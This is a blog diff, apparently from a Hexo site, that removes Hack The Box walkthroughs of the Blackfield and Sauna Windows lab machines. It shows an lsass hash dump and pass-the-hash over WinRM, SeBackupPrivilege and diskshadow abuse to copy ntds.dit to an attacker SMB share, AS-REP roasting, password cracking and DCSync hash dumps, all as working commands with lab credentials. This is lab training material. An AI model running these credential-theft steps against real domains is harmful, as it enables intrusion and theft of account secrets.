-<p>进行简要信息分析后，发现有几个账户的内容，比如<code>svc_backup</code>,<code>Administrator</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat lsadump |grep svc_backup -C 5                                                                                                                                                       </span><br><span class="line">FILE: ======== lsass.DMP =======               </span><br><span class="line">== LogonSession ==                             </span><br><span class="line">authentication_id 406458 (633ba)           </span><br><span class="line">session_id 2                                </span><br><span class="line">username svc_backup                     </span><br><span class="line">domainname BLACKFIELD             </span><br><span class="line">logon_server DC01                      </span><br><span class="line">logon_time 2020-02-23T18:00:03.423728+00:00    </span><br><span class="line">sid S-1-5-21-4194615774-2175524697-3563712290-1413                         </span><br><span class="line">luid 406458                                                                           </span><br><span class="line">        == MSV ==                       </span><br><span class="line">                Username: svc_backup                                                           </span><br><span class="line">                Domain: BLACKFIELD                                                          </span><br><span class="line">                LM: NA                                                                        </span><br><span class="line">                NT: 9658d1d1dcd9250115e2205d9f48400d                                                                   </span><br><span class="line">                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c                                                              </span><br><span class="line">                DPAPI: a03cd8e9d30171f3cfe8caad92fef621                                                                                   </span><br></pre></td></tr></table></figure>
-
-<p>获得了svc_backup账号的hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_backup:9658d1d1dcd9250115e2205d9f48400d</span><br></pre></td></tr></table></figure>
-
-<p>验证凭证,发现可以用winrm登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec winrm 10.10.10.192 -u svc_backup -H &#x27;9658d1d1dcd9250115e2205d9f48400d&#x27;</span><br><span class="line">SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman</span><br><span class="line">WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>evil-winrm</code>登录主机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.192 -u $ evil-winrm -i 10.10.10.192 -u svc_backup -H &#x27;9658d1d1dcd9250115e2205d9f48400d&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>flag在用户Desktop上</p>
-<img src="/undefined/3db8feaa/userflag.png" class="">
-
-<h2 id="0x06-svc-backup-gt-Administrator"><a href="#0x06-svc-backup-gt-Administrator" class="headerlink" title="0x06 svc_backup -&gt; Administrator"></a>0x06 svc_backup -&gt; Administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>发现账户存在<code>SeBackupPrivilege</code>权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></pre></td></tr></table></figure>
-
-<p>这意味着我们可已利用这权限将一些没有权限访问读取的文件备份到一个可写目录下从而使得我们可以越权读取文件。</p>
-<p>先上传一些工具</p>
-<img src="/undefined/3db8feaa/image-20230509232448021.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; import-module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; import-module .\SeBackupPrivilegeUtils.dll</span><br></pre></td></tr></table></figure>
-
-<p>接着我们便可以尝试直接复制root.txt,但是很可惜，我们并不能复制该文件，同样也不能复制<code>ntds.dit</code>文件，因为后者正被另一个进程所使用。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt so1.txt</span><br><span class="line">Opening input file. - Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception</span><br><span class="line">    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .</span><br><span class="line">Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception</span><br><span class="line">    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege</span><br></pre></td></tr></table></figure>
-
-<h3 id="Diskshadow"><a href="#Diskshadow" class="headerlink" title="Diskshadow"></a>Diskshadow</h3><blockquote>
-<p>Diskshadow.exe 是一种公开卷影复制服务 (VSS) 提供的功能的工具。  默认情况下，Diskshadow 使用类似于 Diskraid 或 Diskpart 的交互式命令解释器。  Diskshadow 还包括一个脚本模式。 </p>
-</blockquote>
-<p>此时我们可以利用diskshadow来将c盘挂载到另一个驱动器上，这样我们就可以复制其中的内容达到提权的效果。</p>
-<p>两个脚本内容如下</p>
-<p>diskshadow.txt</p>
-<blockquote>
-<p>需要注意的是set metadata可以用于指定<code> .cab</code>文件的存储路径，我们需要使其存储在可写目录下，否则无法成功挂在到另一个驱动器上</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">set metadata c:\programdata\sol.cab</span><br><span class="line">set verbose on</span><br><span class="line">create</span><br><span class="line">expose %someAlias% z:</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
-
-<p>delete.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete shadows volume z</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
-
-<p>此时由于运行程序是在windows上，我们需要对文件格式进行处理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ unix2dos diskshadow.txt</span><br><span class="line">$ unix2dos delete.txt</span><br></pre></td></tr></table></figure>
-
-<p>然后上传到目标主机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; upload /home/sollupus/OSCP/Blackfield/exploit/diskshadow.txt</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; upload /home/sollupus/OSCP/Blackfield/exploit/delete.txt</span><br></pre></td></tr></table></figure>
-
-<p>然后运行脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; diskshadow /s .\diskshadow.txt</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/3db8feaa/image-20230509233656418.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; diskshadow /s .\diskshadow.txt</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/3db8feaa/image-20230509233605284.png" class="">
-
-<p>这样一来，我们就可以获取C盘下的所有内容了</p>
-<h3 id="Grab-ntds-dit"><a href="#Grab-ntds-dit" class="headerlink" title="Grab ntds.dit"></a>Grab ntds.dit</h3><p>先在本地开启smbserver，然后直接将ntds.dit文件传输到本地主机上</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; copy-filesebackupprivilege z:\windows\ntds\ntds.dit .</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; mv .\ntds.dit \\10.10.16.x\share\ntds.dit</span><br></pre></td></tr></table></figure>
-
-<p>然后再将SYSTEM内容传输过来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; reg save hklm\system</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; mv SYSTEM \\10.10.16.x\share\SYSTEM</span><br></pre></td></tr></table></figure>
-
-<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>使用secretsdump工具转储hash,成功获取Administrator的hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -o secretsdump</span><br><span class="line">$ cat secretsdump.ntds|grep -i administrator</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</span><br></pre></td></tr></table></figure>
-
-<p>然后我们就可以利用各种工具登录目标机器</p>
-<img src="/undefined/3db8feaa/image-20230509234412462.png" class="">
-
-<p>root.txt</p>
-<img src="/undefined/3db8feaa/rootflag.png" class="">
+          <h1 id="HTB-Blackfiled-Walkthrough"><a href="#HTB-Blackfiled-Walkthrough" class="headerlink" title="HTB Blackfiled  Walkthrough"></a>HTB Blackfiled  Walkthrough</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/3db8feaa.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -481,7 +350,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:44" itemprop="dateModified" datetime="2024-09-27T21:10:44+08:00">2024-09-27</time>
               </span>
 
           
@@ -495,69 +364,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Sauna"><a href="#Sauna" class="headerlink" title="Sauna"></a>Sauna</h1><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.93 scan initiated Fri May  5 15:30:30 2023 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oN nmapTcp 10.10.10.175</span><br><span class="line">Nmap scan report for 10.10.10.175</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Egotistical Bank :: Home</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-05 14:30:47Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h00m00s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2023-05-05T14:31:08</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Fri May  5 15:31:49 2023 -- 1 IP address (1 host up) scanned in 79.48 seconds</span><br></pre></td></tr></table></figure>
-
-<h3 id="ldap-389"><a href="#ldap-389" class="headerlink" title="ldap  - 389"></a>ldap  - 389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://10.10.10.175 -x -s base namingcontext</span><br><span class="line">    </span><br><span class="line">namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -h 10.10.10.175 -b &#x27;DC=EGOTISTICAL-BANK,DC=LOCAL&#x27;</span><br><span class="line"></span><br><span class="line">dn: DC=EGOTISTICAL-BANK,DC=LOCAL                      </span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: domain</span><br><span class="line">objectClass: domainDNS</span><br><span class="line">distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">instanceType: 5</span><br><span class="line">whenCreated: 20200123054425.0Z</span><br><span class="line">whenChanged: 20200216124516.0Z</span><br><span class="line">subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>
-
-<h3 id="website-80"><a href="#website-80" class="headerlink" title="website  -80"></a>website  -80</h3><p>find some teammate’s name.</p>
-<img src="/undefined/55527558/image-20230507213825194.png" class="">
-
-<h3 id="kerberos-88"><a href="#kerberos-88" class="headerlink" title="kerberos  -88"></a>kerberos  -88</h3><p>using kerbrute to userenum to get valid user lists. </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175</span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (n/a) - 02/15/20 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2020/02/15 14:41:50 &gt;  Using KDC(s):</span><br><span class="line">2020/02/15 14:41:50 &gt;   10.10.10.175:88</span><br><span class="line"></span><br><span class="line">2020/02/15 14:41:59 &gt;  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/15 14:42:46 &gt;  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/15 14:42:54 &gt;  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/15 14:43:21 &gt;  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/15 14:47:43 &gt;  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/15 16:01:56 &gt;  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/16 03:13:54 &gt;  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/16 03:13:54 &gt;  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL</span><br><span class="line">2020/02/16 03:24:34 &gt;  Done! Tested 8295455 usernames (8 valid) in 17038.364 seconds</span><br></pre></td></tr></table></figure>
-
-<h2 id="Shell-as-fsmith"><a href="#Shell-as-fsmith" class="headerlink" title="Shell as fsmith"></a>Shell as fsmith</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>get-hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers &#x27;EGOTISTICAL-BANK.LOCAL/&#x27; -userfile users.txt -format hashcat -outputfile  hash -dc-ip 10.10.10.175</span><br><span class="line"></span><br><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6917e50f638536dc4a8acec7903dc045$2b03faaa6ed126e97cbc936ab835e16b6a2c185bded1e4f679985c6adcb993ad7b843a05e6fe0ccaa35a9f8d196d161d3b0335a6eaf21e1c4d943d4ad0fba1dcc07283c3172b6eb2ca0f2123f0efb81a517b1a8ca2b6973fd073dff3b67a02961060f232c99e1985aeb80c6d0c7a803cf84c6c8122610c3297f1decc329601aaeec33c92a25c32574d1537e11c09fbdc2c1169d381bdf2864f3a6ff27b457d41df8c0b1b010d5a1b5a2bbf1bd08f3a0259aa5a79ca27a408bf40497c37ecd733425d907c0ad4fc87fbdef0c417718adfe0377123821694223dc850bb23e67edc9afd8254822d24b8f0220c20dd7d0f327937439a1b9284a596c15d49fd9adc97</span><br></pre></td></tr></table></figure>
-
-<p>crack hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</span><br><span class="line"></span><br><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6917e50f638536dc4a8acec7903dc045$2b03faaa6ed126e97cbc936ab835e16b6a2c185bded1e4f679985c6adcb993ad7b843a05e6fe0ccaa35a9f8d196d161d3b0335a6eaf21e1c4d943d4ad0fba1dcc07283c3172b6eb2ca0f2123f0efb81a517b1a8ca2b6973fd073dff3b67a02961060f232c99e1985aeb80c6d0c7a803cf84c6c8122610c3297f1decc329601aaeec33c92a25c32574d1537e11c09fbdc2c1169d381bdf2864f3a6ff27b457d41df8c0b1b010d5a1b5a2bbf1bd08f3a0259aa5a79ca27a408bf40497c37ecd733425d907c0ad4fc87fbdef0c417718adfe0377123821694223dc850bb23e67edc9afd8254822d24b8f0220c20dd7d0f327937439a1b9284a596c15d49fd9adc97:Thestrokes23</span><br></pre></td></tr></table></figure>
-
-<h3 id="Evil-winrm"><a href="#Evil-winrm" class="headerlink" title="Evil-winrm"></a>Evil-winrm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23</span><br></pre></td></tr></table></figure>
-
-<p>And user.txt is in C:\Users\FSmith\desktop</p>
-<img src="/undefined/55527558/user.png" class="">
-
-<h2 id="Priv-fsmith-–-gt-svc-loanmgr"><a href="#Priv-fsmith-–-gt-svc-loanmgr" class="headerlink" title="Priv: fsmith –&gt; svc_loanmgr"></a>Priv: fsmith –&gt; svc_loanmgr</h2><p>using smbserver.py to transfer tools like <code>winpeas.exe</code> to get information.</p>
-<p>on attack host:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share . -smb2support</span><br></pre></td></tr></table></figure>
-
-<p>on victim host:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\\\10.10.16.2\\share\winpeas.exe</span><br></pre></td></tr></table></figure>
-
-<p>then we get a information like this</p>
-<img src="/undefined/55527558/svc_loadnmanager.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; net user</span><br><span class="line"></span><br><span class="line">User accounts for \\                                  </span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            FSmith                   Guest</span><br><span class="line">HSmith                   krbtgt                   svc_loanmgr</span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure>
-
-<p>evil-winrm to svc-loanmgr</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.175 -u svc_loanmgr -p &#x27;Moneymakestheworldgoround!&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Priv-svc-loanmgr-–-gt-root"><a href="#Priv-svc-loanmgr-–-gt-root" class="headerlink" title="Priv: svc_loanmgr –&gt; root"></a>Priv: svc_loanmgr –&gt; root</h2><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound.py -c all -u svc_loanmgr -p &#x27;Moneymakestheworldgoround!&#x27; -ns 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL --zip</span><br></pre></td></tr></table></figure>
-
-<p>then load zip-file to bloodhound</p>
-<h3 id="Analyze-result"><a href="#Analyze-result" class="headerlink" title="Analyze result"></a>Analyze result</h3><img src="/undefined/55527558/image-20230507220204297.png" class="">
-
-<img src="/undefined/55527558/image-20230507220209450.png" class="">
-
-<p>Through Bloodhound,we find that svc_loanmgr has dsync priviliege to domain.so just using <code>secretdump.py</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretdump &#x27;svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::</span><br><span class="line">EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</span><br><span class="line">EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</span><br><span class="line">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::</span><br><span class="line">SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:49f07e880c2babbb9f51fd264c51f979:::</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
